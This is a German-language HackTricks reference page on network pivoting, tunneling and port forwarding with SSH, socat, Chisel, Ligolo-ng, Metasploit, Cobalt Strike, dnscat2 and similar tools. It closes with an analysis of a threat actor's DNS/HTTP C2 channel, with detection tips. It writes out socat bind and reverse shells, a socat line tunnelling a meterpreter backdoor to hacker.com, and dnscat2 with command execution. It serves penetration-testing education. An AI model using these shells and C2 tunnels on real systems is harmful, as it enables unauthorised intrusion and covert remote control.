# Tunneling und Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-Tipp

> [!WARNING]
> Nmaps Proxy-Unterstützung ist auf TCP-Verbindungen beschränkt und beeinflusst keine Ping-, Port- oder OS-Detection-Scans. Wenn sich der Scanner hinter einem SOCKS-Proxy befindet, **deaktiviere die Host-Erkennung** (`-Pn`) und verwende einen **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Der abschließende Befehl verwendet die Optionen `-u` und `-i` von Evil-WinRM, um das Konto und den WinRM-Host anzugeben. Der standardmäßige WinRM-Port ist 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH kann X11-Verbindungen, beliebige TCP-Ports und Unix-Domain-Sockets über seinen verschlüsselten Kanal weiterleiten.<sup>[[6]](#references)</sup>

Grafische SSH-Verbindung (X)

`-Y` aktiviert vertrauenswürdiges X11-Forwarding und `-C` fordert die Komprimierung weitergeleiteter Daten an.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Neuen Port im SSH-Server öffnen --> Anderer Port

Remote-Forwarding (`-R`) lauscht auf dem SSH-Server und verbindet sich mit der lokalen Seite; die explizite Bind-Adresse legt fest, welche Schnittstellen diesen Listener erreichen können.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Lokaler Port --> Compromised host (SSH) --> Third_box:Port

Das lokale (`-L`) forwarding lauscht auf dem Client und verbindet sich von der Seite des SSH-Servers mit dem Ziel.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Lokaler Port --> Compromised Host (SSH) --> Beliebiges Ziel

Dynamische (`-D`) Weiterleitung erstellt einen lokalen SOCKS4/SOCKS5-Listener, dessen Verbindungen von der Remote-Seite aus geöffnet werden.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Multi-hop mit ProxyJump

`-J`/`ProxyJump` verbindet sich über einen oder mehrere durch Kommas getrennte Jump Hosts mit dem Ziel. Die Forwarding-Optionen gehören weiterhin zur finalen SSH-Verbindung, sodass der SOCKS-Listener unten Ziele von `internal-target` aus öffnet, nicht vom ersten Bastion Host. Dadurch muss man sich nicht bei einem Jump Host anmelden und dort einen zweiten SSH-Client starten.<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
Host-spezifische Optionen für Jump-Hosts sollten in `~/.ssh/config` abgelegt werden; die für das Ziel vorgesehene Konfiguration über die Kommandozeile wird nicht automatisch auf Zwischenhosts angewendet.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Dies ist nützlich, um Reverse Shells von internen Hosts über eine DMZ zu deinem Host zu erhalten:

Die Server-Einstellung `GatewayPorts` steuert, ob ein Remote Forward über Loopback hinaus gebunden werden darf; der Standardwert ist `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Dieses root-basierte Beispiel erstellt auf beiden Hosts Tunnelgeräte. Der Server muss tun-Weiterleitung erlauben, und das ausgewählte Konto muss Zugriff auf das tun-Gerät haben; `PermitRootLogin yes` ist eine Möglichkeit, hier das Konto `root` zu verwenden.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Weiterleitung auf der Serverseite aktivieren
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Eine neue Route auf der Client-Seite festlegen
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 hat eine strict-KEX-Erweiterung hinzugefügt, um dem Angriff auf die Integrität des frühen Transports durch Terrapin entgegenzuwirken. Aktualisiere, sofern möglich, beide Peers und befolge bei älteren Implementierungen die Hinweise des Herstellers, anstatt allein aufgrund der Version davon auszugehen, dass ein weitergeleiteter Kanal geschützt ist.<sup>[[8]](#references)</sup>

## SSHUTTLE

Du kannst den gesamten **Traffic** über **ssh** durch einen Host in ein **Subnetwork** **tunneln**.\
Zum Beispiel den gesamten Traffic weiterleiten, der an 10.10.10.0/24 geht.

`sshuttle` ermöglicht transparentes Proxying über SSH und unterstützt die Auswahl von Subnetzen sowie eines benutzerdefinierten SSH-Befehls, wie unten gezeigt.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Mit einem privaten Schlüssel verbinden
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploits `portfwd` unterstützt lokales und Remote-Forwarding, während sein SOCKS-Proxy-Modul für die Verwendung mit Session-Routen oder `autoroute` vorgesehen ist und in diesen Beispielen standardmäßig auf Port 1080 lauscht.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Lokaler Port --> Kompromittierter Host (aktive Session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Eine weitere Möglichkeit:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strikes Beacon kann SOCKS4a-/SOCKS5-Verbindungen über einen Beacon weiterleiten; `rportfwd` bindet auf dem kompromittierten Host, während `rportfwd_local` die Zielverbindung vom Cobalt-Strike-Client aus initiiert.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS-Proxy

Öffne einen Port im Team Server auf den Interfaces, die den Traffic über den Beacon routen sollen.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der Traffic wird an den Team Server und von dort an den angegebenen Host:Port gesendet.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Das reverse-forwarding-Handbuch beschreibt folgendes Verhalten:<sup>[[14]](#references)</sup>

- Beacons reverse port forward ist dafür ausgelegt, **Traffic zum Team Server zu tunneln, nicht zum Weiterleiten zwischen einzelnen Maschinen**.
- Der Traffic wird **innerhalb von Beacons C2-Traffic getunnelt**, einschließlich P2P-Links.
- Hohe Ports umgehen normalerweise Einschränkungen für privilegierte Ports, aber die Richtlinien des Zielbetriebssystems und bereits vorhandene Listener gelten weiterhin.

### rPort2Port local

> [!WARNING]
> In diesem Fall wird der **Port auf dem Beacon-Host geöffnet**, nicht auf dem Team Server, und der **Traffic wird an den Cobalt Strike-Client gesendet** (nicht an den Team Server) und von dort an den angegebenen Host:Port weitergeleitet.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Das Projekt stellt Web-Tunnel-Endpunkte wie `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` und `tunnel.php` bereit. Lade einen unterstützten Endpunkt hoch, bevor du den lokalen Proxy startest.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Du kannst es von der Releases-Seite unter [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) herunterladen.\
Chisel überträgt TCP/UDP-Datenverkehr über HTTP mithilfe einer durch SSH geschützten Verbindung. Verwende kompatible Client-/Server-Builds und überprüfe die Befehlssyntax des ausgewählten Releases.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Portweiterleitung
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) überträgt statische oder dynamische Forwards über WebSocket, HTTP/2 oder WebTransport (HTTP/3 über QUIC). Aktuelle Builds unterstützen TCP, UDP, Unix-Sockets, stdio, SOCKS5, HTTP-Proxying sowie Linux-Listener für transparente Proxies in Forward- und Reverse-Modi.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Führe den Server auf dem Angreifer aus und lasse den Pivot sich mit `-R` ausgehend verbinden. In dieser Richtung wird der SOCKS5-Listener auf dem **Server** erstellt, während angeforderte Verbindungen aus dem Netzwerk des **Clients/Pivots** stammen.<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
Ein Reverse Static Forward verwendet dieselbe Richtung. Beispielsweise stellt das Folgende `10.10.10.20:445`, wie es über den Pivot erreicht wird, am Loopback-Port `8445` des Angreifers bereit:<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### Details zu Egress und Transport

- Füge dem Client `-p http://user:pass@proxy:8080` hinzu, um einen expliziten HTTP-Proxy zu durchqueren. Verwende in Clients wie `curl` `socks5h://127.0.0.1:1080` (oder aktiviere proxied DNS in der Anwendung), damit interne Namen jenseits des Tunnels statt über den lokalen Resolver aufgelöst werden.<sup>[[52]](#references)</sup>
- `wss://` wählt WebSocket mit TLS-Schutz aus. Ein `https://`-Client wählt HTTP/2 aus, aber Buffering oder die Konvertierung zu HTTP/1 durch Reverse-Proxies/CDNs unterbricht häufig den bidirektionalen Stream. Stelle den wstunnel-Server beim Testen dieses Modus direkt bereit.<sup>[[52]](#references)</sup>
- `wts://` wählt WebTransport über QUIC aus. Starte den Server mit `--enable-webtransport` (oder einer `wts://`-Listen-URL) und erlaube UDP auf dem Listening-Port. Dieser Modus kann keinen herkömmlichen HTTP-`CONNECT`-Proxy durchqueren, da dieser Proxy TCP transportiert.<sup>[[52]](#references)</sup>

> [!WARNING]
> Das Upstream-Projekt warnt davor, sein eingebettetes selbstsigniertes Zertifikat als Datenschutzmaßnahme zu betrachten. Bevorzuge ein gültiges benutzerdefiniertes Zertifikat zusammen mit `--tls-verify-certificate` (oder mTLS), belasse Proxy-Listener auf Loopback, sofern kein entfernter Zugriff beabsichtigt ist, und tunnle bereits sichere Protokolle, wenn Vertraulichkeit wichtig ist.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Der Ligolo-ng-Schnellstart dokumentiert eine TUN-Schnittstelle auf dem Proxy, die Validierung des Certificate-Fingerprints für den Agent und die Einrichtung von Routen für das getunnelte Netzwerk.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent-Binding und Listening

Ligolo-ng kann Listener auf dem Agent hinzufügen, die an eine Proxy-seitige Adresse weiterleiten, und sein reservierter Bereich `240.0.0.0/4` kann geroutet werden, um agent-lokale Services zu erreichen.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Zugriff auf lokale Ports des Agents
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot startet den umgekehrten Tunnel vom Opfer aus und stellt eine SOCKS4-Proxy auf der Loopback-Adresse des Angreifers bereit; die README dokumentiert außerdem Zugangsdaten und Hash-Optionen für NTLM-Proxys.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot über **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombiniert Adresstypen wie `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` und `PROXY`; die folgenden Beispiele kombinieren diese dokumentierten Endpunkte.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port über socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter über SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Du kannst einen **nicht authentifizierten Proxy** mit dem dokumentierten `PROXY`-Adresstyp von socat durchqueren, indem du diese Zeile anstelle der letzten Zeile in der Konsole des Opfers ausführst.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Erstelle Zertifikate auf beiden Seiten: Client und Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbinde den lokalen SSH-Port (22) mit Port 443 des Angreifer-Hosts
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink ist PuTTYs Befehlszeilen-Verbindungstool mit SSH-Weiterleitungsoptionen, die `ssh` ähneln.<sup>[[22]](#references)</sup>

Verwende für den SSH-Port das großgeschriebene `-P`. `-pw` bleibt aus Kompatibilitätsgründen erhalten, gibt das Passwort jedoch in der Prozessliste preis; bevorzuge nach Möglichkeit die Schlüsselauthentifizierung oder `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Da diese Binärdatei auf dem Opfer ausgeführt wird und es sich um einen SSH-Client handelt, öffne den SSH-Dienst und den Port für die Reverse-Verbindung; im Folgenden wird `-R` verwendet, um einen lokal zugänglichen Port an den Rechner des Angreifers weiterzuleiten.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Verwende beim Erstellen oder Ändern persistenter `portproxy`-Regeln einen Kontext mit den vom Host benötigten Berechtigungen. Microsoft dokumentiert die unten verwendeten Formen zum Hinzufügen, Anzeigen und Löschen von `v4tov4`.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Sie benötigen **RDP-Zugriff auf das System**.\
Laden Sie Folgendes herunter:

SocksOverRDP verwendet Remote Desktop Dynamic Virtual Channels, um eine SOCKS5-Verbindung über eine bestehende RDP-Sitzung zu übertragen; das Client-Plugin lauscht auf `127.0.0.1:1080`, während die Serverkomponente auf dem RDP-Ziel ausgeführt wird.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64-Binärdateien](https://github.com/nccgroup/SocksOverRDP/releases) – Dieses Tool verwendet `Dynamic Virtual Channels` (`DVC`) der Windows-Funktion Remote Desktop Service. DVC ist für das **Tunneln von Paketen über die RDP-Verbindung** verantwortlich.
2. [Proxifier Portable-Binärdatei](https://www.proxifier.com/download/#win-tab)

Laden Sie auf Ihrem Client-Computer **`SocksOverRDP-Plugin.dll`** wie folgt:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Jetzt können wir uns mit **`mstsc.exe`** über **RDP** mit dem **Opfer** **verbinden**. Daraufhin sollte eine **Meldung** erscheinen, dass das **SocksOverRDP-Plugin aktiviert** ist und auf **127.0.0.1:1080** **lauscht**.

Über **RDP** **verbinden** und die Binärdatei `SocksOverRDP-Server.exe` auf den Rechner des Opfers hochladen und dort ausführen:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bestätige nun auf deiner Maschine (Angreifer), dass Port 1080 lauscht:
```
netstat -antb | findstr 1080
```
Jetzt können Sie [**Proxifier**](https://www.proxifier.com/) verwenden, um den Traffic über diesen Port durch den Proxy zu leiten.<sup>[[26]](#references)</sup>

## Windows-GUI-Anwendungen mit Proxifier

Sie können Windows-GUI-Anwendungen mithilfe von [**Proxifier**](https://www.proxifier.com/) über einen Proxy leiten.<sup>[[26]](#references)</sup>\
Fügen Sie unter **Profile -> Proxy Servers** die IP-Adresse und den Port des SOCKS-Servers hinzu.\
Fügen Sie unter **Profile -> Proxification Rules** den Namen des zu proxifizierenden Programms sowie die Verbindungen zu den IPs hinzu, die Sie proxifizieren möchten; Proxifier-Regeln können Anwendungen, Zielhosts und Ports abgleichen.<sup>[[27]](#references)</sup>

## Durch einen NTLM-Proxy tunneln

Das zuvor erwähnte Tool **Rpivot** kann über einen NTLM-authentifizierenden Proxy weiterleiten. **OpenVPN** kann ebenfalls über einen solchen Proxy routen, wenn es mit einer Auth-Datei und der NTLMv2-Methode konfiguriert ist; dabei handelt es sich um eine Proxy-Umgehung, nicht um eine Umgehung der Proxy-Authentifizierung.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm authentifiziert sich bei vorgeschalteten NTLM-Proxies, stellt lokale Listener bereit und kann einen lokalen Tunnel-Port einem Zieldienst zuordnen; Clients können dann diesen lokalen Port verwenden.<sup>[[29]](#references)</sup>\
Zum Beispiel leitet dieser Port 443 weiter
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Wenn du beispielsweise auf dem **victim** den **SSH**-Dienst so einstellst, dass er auf Port 443 lauscht, kannst du dich über den Port 2222 des **attacker** damit verbinden.<sup>[[29]](#references)</sup>\
Du könntest auch einen **meterpreter** verwenden, der sich mit localhost:443 verbindet, während der **attacker** auf Port 2222 lauscht.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ist Microsofts .NET-Toolkit für Reverse-Proxies. Du findest es hier: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine erstellt einen IPv4-Tunnel über DNS-Abfragen und verwendet TUN-Interfaces; für die dokumentierte Einrichtung sind auf beiden Seiten die erforderlichen Berechtigungen zum Erstellen dieser Interfaces erforderlich.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS-Transport hat einen höheren Overhead als direktes TCP und ist typischerweise langsam; du kannst eine komprimierte SSH-Verbindung durch diesen Tunnel herstellen, indem du Folgendes verwendest:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Hier herunterladen**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 stellt einen verschlüsselten Command-and-Control-Kanal über DNS her; die folgenden Server- und Client-Befehle entsprechen der dokumentierten Verwendung.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Du kannst [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) verwenden, um einen dnscat2-Client in PowerShell auszuführen; die README dokumentiert die unten gezeigten `Start-Dnscat2`-Parameter.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Portweiterleitung mit dnscat**

Der interaktive Befehl `listen` von Dnscat2 ordnet einen lokalen Listener einem entfernten Host und Port zu.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### DNS von proxychains ändern

Proxychains-ng klinkt sich dynamisch in TCP-Verbindungen ein und kann weder UDP noch ICMP übertragen; das DNS-Proxying ist konfigurierbar. Untersuche daher die installierte `proxychains.conf` und den Resolver-Helfer, statt von einem festen öffentlichen Resolver auszugehen. Legacy-`proxyresolv`-Skripte stellen `PROXY_DNS_SERVER` zur Auswahl des Resolvers bereit. Verwende einen vom Pivot aus erreichbaren Resolver, wenn interne Namen benötigt werden.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Benutzerdefiniertes DNS TXT / HTTP JSON C2 (AK47C2)

Der Akteur Storm-2603 erstellte ein **Dual-Channel-C2 ("AK47C2")**, das **ausschließlich** ausgehenden **DNS**- und **unverschlüsselten HTTP-POST**-Traffic missbraucht – zwei Protokolle, die in Unternehmensnetzwerken nur selten blockiert werden.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Erzeugt eine zufällige 5-stellige SessionID (z. B. `H4T14`).
• Stellt `1` für *task requests* oder `2` für *results* voran und verkettet verschiedene Felder (Flags, SessionID, Computername).
• Jedes Feld wird mit dem ASCII-Schlüssel `VHBD@H` **XOR-verschlüsselt**, hexadezimal kodiert und durch Punkte verbunden – abschließend folgt die vom Angreifer kontrollierte Domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Für **TXT**- (und ersatzweise **MG**-)Records werden `DnsQuery()`-Anfragen verwendet.
• Wenn die Antwort 0xFF Bytes überschreitet, **fragmentiert** die Backdoor die Daten in 63-Byte-Abschnitte und fügt die Marker
`s<SessionID>t<TOTAL>p<POS>` ein, damit der C2-Server sie wieder in die richtige Reihenfolge bringen kann.

2. **HTTP mode (AK47HTTP)**
• Erstellt einen JSON-Umschlag:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Das gesamte Blob wird mit `VHBD@H` XOR-verschlüsselt → hexadezimal kodiert → als Body eines **`POST /`** mit dem Header `Content-Type: text/plain` gesendet.
• Die Antwort verwendet dieselbe Kodierung, und das Feld `cmd` wird mit `cmd.exe /c <command> 2>&1` ausgeführt.

Hinweise für das Blue Team
• Suche nach ungewöhnlichen **TXT-Abfragen**, deren erstes Label aus einer langen Hexadezimalzeichenfolge besteht und die immer mit einer seltenen Domain enden.
• Ein konstanter XOR-Schlüssel gefolgt von ASCII-Hex ist mit YARA einfach zu erkennen: `6?56484244?484` (`VHBD@H` in Hex).
• Markiere bei HTTP `text/plain`-POST-Bodies, die ausschließlich aus Hex bestehen und eine gerade Anzahl von Bytes enthalten.

{{#note}}
Der Channel hält jedes Subdomain-Label innerhalb des DNS-Limits von 63 Oktetten. Die Protokollkonformität allein macht ihn jedoch nicht unauffällig; seltene Domains, lange hexadezimale Labels und das Abfragevolumen bleiben Erkennungssignale.<sup>[[2]](#references)[[36]](#references)</sup>
